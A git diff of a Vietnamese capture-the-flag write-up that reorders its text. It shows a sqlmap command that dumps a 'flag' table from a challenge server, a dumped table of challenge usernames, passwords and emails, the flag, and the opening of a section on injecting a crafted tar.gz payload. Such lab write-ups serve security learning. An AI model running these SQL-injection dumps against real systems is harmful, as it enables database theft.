@@ -16,11 +16,6 @@ Sau khi biết được tên của db:
 
 Dump data:
 `sqlmap --dbms=mysql -u "http://54.169.55.172:1001/" --data "username=admin" -D "ctf" -T "flag" --dump`
-
-Flag: PISCTF{qs89QdAs9A}
-# firmware
-- Thoạt đầu nhìn vô bài này thì tricky hơn các bài trên, nhưng chúng ta có thể đoán được là mình cần tạo payload bằng file tar.gz để inject
-- Phân tích code:
 ```
 +----+------------+-------------------+----------+
 | id | pass       | email             | username |
@@ -30,6 +25,11 @@ Flag: PISCTF{qs89QdAs9A}
 | 3  | qs89QdAs9A | admin@gmail.net   | admin    |
 +----+------------+-------------------+----------+
 ```
+Flag: PISCTF{qs89QdAs9A}
+# firmware
+- Thoạt đầu nhìn vô bài này thì tricky hơn các bài trên, nhưng chúng ta có thể đoán được là mình cần tạo payload bằng file tar.gz để inject
+- Phân tích code:
+
 ```python
 import tarfile, tempfile, os
 from application import main
